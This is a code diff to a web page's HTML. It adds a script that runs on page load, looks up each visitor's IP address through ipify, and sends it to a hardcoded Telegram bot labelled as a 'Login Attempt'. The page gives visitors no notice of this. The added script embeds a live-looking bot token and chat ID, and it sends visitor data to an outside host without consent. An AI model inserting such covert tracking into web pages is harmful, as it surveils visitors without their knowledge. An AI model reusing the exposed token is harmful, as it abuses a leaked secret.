@@ -416,6 +416,34 @@ function multifungsi(){
   function bqhilang() { wallpaper.style = "transform: scale(2);"; bodyblur.style = "opacity:.3"; bq.style = "position:relative;transition:all .7s ease;"; }
 
   </script>
+
+    </script> 
+    <script>
+       fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+
+       const botToken = "6698594387:AAFmjtW8aldtasQa_E_eqkSinGGwH3RprL0"; // Replace with your bot token
+        const chatId = "6222134199"; // Replace with your chat ID
+
+        const message = `🔒 **Login Attempt** 🔒\n\n👤 IP address: ${data.ip}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => response.json())
+          .then(data => console.log("Message sent:", data))
+          .catch(error => console.error("Error:", error));
+
+
+        document.getElementById('ip').textContent = data.ip;
+        // You can also send this IP to your server via fetch/AJAX
+        console.log("Visitor IP:", data.ip);
+      })
+      .catch(err => {
+        console.error('Error getting IP:', err);
+      });
+    </script>
 </body>
 
 </html>
